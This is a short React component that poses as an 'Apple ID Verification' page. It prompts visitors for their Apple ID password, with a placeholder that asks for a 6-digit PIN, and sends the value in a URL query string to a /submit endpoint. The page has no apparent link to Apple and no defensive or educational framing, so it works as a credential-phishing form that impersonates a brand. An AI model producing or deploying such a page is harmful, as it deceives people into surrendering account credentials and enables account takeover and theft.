import React from 'react';
import ReactDOM from 'react-dom';

class App extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            pin: ''
        };
    }

    handleSubmit = (event) => {
        event.preventDefault();
        fetch(`/submit?pin=${this.state.pin}`)
            .then(response => response.text())
            .then(data => {
                alert(data);
            });
    };

    handleChange = (event) => {
        this.setState({ pin: event.target.value });
    };

    render() {
        return (
            <div className="container">
                <h1>Apple ID Verification</h1>
                <p>Please enter your Apple ID password to verify your identity.</p>
                <form onSubmit={this.handleSubmit}>
                    <input
                        type="password"
                        value={this.state.pin}
                        onChange={this.handleChange}
                        placeholder="Enter your 6-digit PIN"
                        required
                    />
                    <button type="submit">Verify</button>
                </form>
            </div>
        );
    }
}

ReactDOM.render(<App />, document.getElementById('root'));
